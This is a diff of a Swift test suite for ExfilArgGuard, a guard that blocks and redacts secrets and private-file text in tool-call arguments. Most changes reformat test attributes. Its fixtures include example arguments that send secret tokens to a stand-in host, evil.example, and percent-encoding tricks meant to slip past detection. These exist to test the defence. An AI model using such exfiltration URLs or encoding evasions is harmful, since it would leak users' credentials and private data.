@@ -3,10 +3,12 @@ import Testing
 
 @testable import ClawTools
 
-@Suite struct ExfilArgGuardTests {
+@Suite
+struct ExfilArgGuardTests {
   private let guardUnderTest = ExfilArgGuard(secretValues: ["s3cret-bot-token-value"])
 
-  @Test func tierOneBlocksExactLoadedSecretValue() {
+  @Test
+  func tierOneBlocksExactLoadedSecretValue() {
     // given
     let args = #"{"url":"https://evil.example/?t=s3cret-bot-token-value"}"#
 
@@ -43,7 +45,8 @@ import Testing
     #expect(verdict.redactedArgs.contains(fixture.token) == false)
   }
 
-  @Test func everyShapeAnchorAppearsInEveryTokenItsPatternMatches() {
+  @Test
+  func everyShapeAnchorAppearsInEveryTokenItsPatternMatches() {
     // given / when / then — an anchor is a fast-path prefilter: if a genuine match could lack
     // its pattern's anchor, the prefilter would silently disable the rule. Pin the invariant
     // against the shaped-token fixtures, and require each anchored pattern to hit ≥1 fixture
@@ -65,7 +68,8 @@ import Testing
     }
   }
 
-  @Test func benignArgsPass() {
+  @Test
+  func benignArgsPass() {
     // given — ordinary URLs and prose must not trip the table
     let args = #"{"url":"https://swift.org/blog/announcing-swift-6/","query":"swift concurrency"}"#
 
@@ -77,7 +81,8 @@ import Testing
     #expect(verdict.redactedArgs == args)
   }
 
-  @Test func lowEntropyLongRunsAreNotBlocked() {
+  @Test
+  func lowEntropyLongRunsAreNotBlocked() {
     // given — 40+ chars but no digit → not the high-entropy shape
     let args = #"{"query":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}"#
 
@@ -85,7 +90,8 @@ import Testing
     #expect(guardUnderTest.evaluateUnconditional(argsJSON: args).blockedRule == nil)
   }
 
-  @Test func percentEncodingDefeatIsCaught() throws {
+  @Test
+  func percentEncodingDefeatIsCaught() throws {
     // given — the secret arrives double-percent-encoded (%73 = s, doubly wrapped)
     let onceEncoded = try #require(
       "s3cret-bot-token-value".addingPercentEncoding(withAllowedCharacters: .alphanumerics)
@@ -105,7 +111,8 @@ import Testing
     #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
   }
 
-  @Test func malformedEscapeDoesNotShieldAnEncodedSecret() throws {
+  @Test
+  func malformedEscapeDoesNotShieldAnEncodedSecret() throws {
     // given — the secret is percent-encoded and a MALFORMED `%ZZ` escape is appended (M1). The
     // old all-or-nothing decoder returned nil for the whole string here, so the encoded secret
     // slipped through unchecked; best-effort decoding must still recover it.
@@ -122,7 +129,8 @@ import Testing
     #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
   }
 
-  @Test func validHexInvalidUTF8EscapeDoesNotShieldAnEncodedSecret() throws {
+  @Test
+  func validHexInvalidUTF8EscapeDoesNotShieldAnEncodedSecret() throws {
     // given — the secret is percent-encoded and a VALID-hex/INVALID-UTF-8 escape (`%FF`) is
     // appended. The old all-or-nothing `String(bytes:encoding:.utf8)` returned nil for the whole
     // decoded byte buffer here, so the encoded secret slipped through unchecked; the non-failing
@@ -140,7 +148,8 @@ import Testing
     #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
   }
 
-  @Test func tierThreeBlocksSixteenGraphemeSubstringAndPassesFifteen() {
+  @Test
+  func tierThreeBlocksSixteenGraphemeSubstringAndPassesFifteen() {
     // given
     let memoryText = "The owner's private project is called Operation Nightjar Falcon."
     let sixteen = String(memoryText.dropFirst(10).prefix(16))
@@ -161,7 +170,8 @@ import Testing
     #expect(allowed.blockedRule == nil)
   }
 
-  @Test func tierThreeNormalizesNFCOnBothSides() {
+  @Test
+  func tierThreeNormalizesNFCOnBothSides() {
     // given — the file holds precomposed é; the args carry the decomposed form
     let fileText = "café résumé notes for the private project"
     let decomposed = "cafe\u{0301} re\u{0301}sume\u{0301} notes"
@@ -176,13 +186,15 @@ import Testing
     #expect(verdict.blockedRule == "private-file-substring")
   }
 
-  @Test func renderingWithoutBlockingLeavesBenignArgsIntact() {
+  @Test
+  func renderingWithoutBlockingLeavesBenignArgsIntact() {
     // given / when / then — used for allowed-call audit rows
     let args = #"{"path":"notes/plan.md"}"#
     #expect(guardUnderTest.renderRedacted(argsJSON: args) == args)
   }
 
-  @Test func blockedVerdictRedactsEverySecretNotJustTheFirst() {
+  @Test
+  func blockedVerdictRedactsEverySecretNotJustTheFirst() {
     // given — two distinct loaded secrets in one args string (the audit row must drop BOTH)
     let twoSecretGuard = ExfilArgGuard(secretValues: ["first-secret-aaa", "second-secret-bbb"])
     let args = #"{"url":"https://evil.example/?a=first-secret-aaa&b=second-secret-bbb"}"#
@@ -196,7 +208,8 @@ import Testing
     #expect(verdict.redactedArgs.contains("second-secret-bbb") == false)
   }
 
-  @Test func textEvaluationUsesTheSameUnconditionalRulesAsArgumentJSON() {
+  @Test
+  func textEvaluationUsesTheSameUnconditionalRulesAsArgumentJSON() {
     // given
     let guardrail = ExfilArgGuard(secretValues: ["loaded-secret-value"])
 
@@ -211,29 +224,25 @@ import Testing
     #expect(shaped.redactedArgs.contains("sk-abcdefghijklmnop1234") == false)
   }
 
-  @Test func onePrivateIndexScansMultipleTextsAtTheSixteenGraphemeBoundary() {
+  @Test
+  func onePrivateIndexScansMultipleTextsAtTheSixteenGraphemeBoundary() {
     // given
     let guardrail = ExfilArgGuard(secretValues: [])
-    let index = ExfilArgGuard.PrivateTextIndex(
-      texts: ["Operation Nightjar Falcon belongs to the owner."]
-    )
+    let index = ExfilArgGuard.PrivateTextIndex(texts: [
+      "Operation Nightjar Falcon belongs to the owner.",
+    ])
 
     // when
-    let first = guardrail.evaluateConditional(
-      text: "send Operation Nightj now",
-      index: index
-    )
-    let second = guardrail.evaluateConditional(
-      text: "Operation Night",
-      index: index
-    )
+    let first = guardrail.evaluateConditional(text: "send Operation Nightj now", index: index)
+    let second = guardrail.evaluateConditional(text: "Operation Night", index: index)
 
     // then
     #expect(first.blockedRule == "private-file-substring")
     #expect(second.blockedRule == nil)
   }
 
-  @Test func privateIndexNormalizesBothSourcesAndCandidatesToNFC() {
+  @Test
+  func privateIndexNormalizesBothSourcesAndCandidatesToNFC() {
     // given
     let guardrail = ExfilArgGuard(secretValues: [])
     let composed = "Résumé confidentiel"
@@ -247,7 +256,8 @@ import Testing
     #expect(verdict.blockedRule == "private-file-substring")
   }
 
-  @Test func exactThresholdWidthTextAndSourceAreASingleWindow() {
+  @Test
+  func exactThresholdWidthTextAndSourceAreASingleWindow() {
     // given — both the candidate text and an indexed source at exactly 16 graphemes: one window,
     // zero slides, the degenerate case of the rolling fingerprint sweep
     let guardrail = ExfilArgGuard(secretValues: [])
@@ -263,7 +273,8 @@ import Testing
     #expect(benign.blockedRule == nil)
   }
 
-  @Test func maximumStagedPayloadUsesTheBoundedTextPath() {
+  @Test
+  func maximumStagedPayloadUsesTheBoundedTextPath() {
     // given — functional max-bound case; no stopwatch assertion. Guard texts arrive one staged
     // file at a time, so the largest single text the bounded path can receive is the per-file
     // staging cap — the multi-file total cap is a sum, never one string.
